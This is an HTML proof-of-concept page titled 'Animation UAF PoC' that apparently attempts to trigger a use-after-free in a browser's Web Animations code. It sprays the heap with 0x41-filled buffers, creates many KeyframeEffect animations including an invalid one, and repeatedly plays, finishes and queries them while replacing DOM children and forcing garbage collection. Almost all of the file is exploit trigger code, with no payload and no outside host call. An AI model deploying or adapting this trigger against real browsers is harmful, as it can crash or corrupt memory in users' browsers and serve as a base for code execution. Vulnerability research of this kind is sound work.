<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Animation UAF PoC</title>
</head>
<body>
    <div id="target"></div>
    <script>
        function stressGC() {
            for (let i = 0; i < 2000; i++) {
                new ArrayBuffer(1024 * 1024);
            }
            for (let i = 0; i < 300; i++) {
                new ArrayBuffer(2 * 1024 * 1024);
            }
        }

        // Heap spray
        const spray = [];
        for (let i = 0; i < 2000; i++) {
            const buf = new Uint8Array(1024 * 1024);
            buf.fill(0x41);
            spray.push(buf);
        }

        // Create animations
        const target = document.getElementById('target');
        const keyframes = { transform: ['translateX(0)', 'translateX(100px)'] };
        const animations = [];
        for (let i = 0; i < 50; i++) {
            const effect = new KeyframeEffect(target, keyframes, { duration: 1000 });
            animations.push(new Animation(effect, document.timeline));
        }
        // Add invalid effect
        try {
            const invalidEffect = new KeyframeEffect(target, null, { duration: 0 });
            animations.push(new Animation(invalidEffect, document.timeline));
        } catch (e) {}

        // Trigger UAF
        setInterval(() => {
            animations.forEach(anim => {
                anim.play();
                anim.finish();
                anim.effect.getComputedTiming();
            });
            target.replaceChildren('test');
            stressGC();
        }, 5);
    </script>
</body>
</html>